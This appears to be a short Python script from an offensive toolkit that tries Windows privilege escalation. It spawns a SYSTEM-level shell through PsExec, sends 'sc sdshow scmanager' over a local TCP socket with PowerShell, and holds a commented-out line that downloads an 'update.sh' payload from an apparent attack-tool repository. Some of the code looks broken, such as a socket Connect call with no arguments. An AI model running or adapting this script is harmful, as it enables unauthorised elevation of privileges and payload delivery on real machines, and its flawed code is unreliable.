import os
from pyuac import main_requires_admin #add pyuac and pypiwin32 to requirements.txt

def priv_escaltion():
    #run exe file from path
    os.system("SysinternalsSuite\PsExec.exe -s -i cmd.exe")
    #use powershell to send "sc sdshow scmanager" to target computer and press enter
    os.system("powershell -c \"$c = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 5555);$c.Connect();$c.Send('sc sdshow scmanager');$c.Disconnect()\"")
    
    os.system("sc sdshow scmanager")
    
    #os.system("powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CosmodiumCS/BlackOpal/main/payloads/update.sh', 'update.sh')")
    input("\n[~] Hit any key to continue...\n")
   


@main_requires_admin
def main():
    priv_escaltion()
    # The window will disappear as soon as the program exits!
    

if __name__ == "__main__":
    main()